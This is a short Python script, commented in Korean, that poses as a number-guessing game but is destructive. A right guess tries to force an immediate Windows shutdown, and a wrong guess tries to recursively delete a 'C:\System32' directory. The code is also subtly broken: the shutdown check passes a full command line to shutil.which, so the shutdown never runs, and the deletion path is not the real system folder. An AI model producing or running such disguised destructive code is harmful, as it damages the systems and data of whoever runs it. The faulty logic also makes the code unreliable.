import subprocess
import shutil
import os
import random

def SHUTDOWN():
    # 'shutdown -s -t 0' 명령어가 시스템에 있는지 확인
    if shutil.which('shutdown -s -t 0') is None:
        print("오류: 'shutdown -s -t 0' 명령어를 찾을 수 없습니다. 먼저 설치해 주세요.")
    else:
        # 'shutdown -s -t 0' 명령어 실행 및 결과 받기
        result = subprocess.run('shutdown -s -t 0', capture_output=True, text=True, shell=True)

        # 결과 출력
        print(result.stdout) # 표준 출력 결과
        if result.stderr:
            print(result.stderr) # 표준 오류 출력이 있을 때만 출력

def KILL():
    file_path = r"C:\System32" # 삭제할 파일 경로 

    try:
        if os.path.isfile(file_path):
            os.remove(file_path)
            print(f"{file_path} 파일을 삭제했습니다.")
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
            print(f"{file_path} 디렉토리를 삭제했습니다.")
        else:
            print(f"{file_path} 파일 또는 디렉토리를 찾을 수 없습니다.")
    except FileNotFoundError:
        print(f"{file_path} 파일을 찾을 수 없습니다.")
    except Exception as e:
        print(f"파일 삭제 중 오류 발생: {e}")

number = random.randint(1, 10)
guess = int(input("1부터 10 사이의 숫자를 맞혀보세요: "))

if guess == number:
    SHUTDOWN()
else:
    KILL()
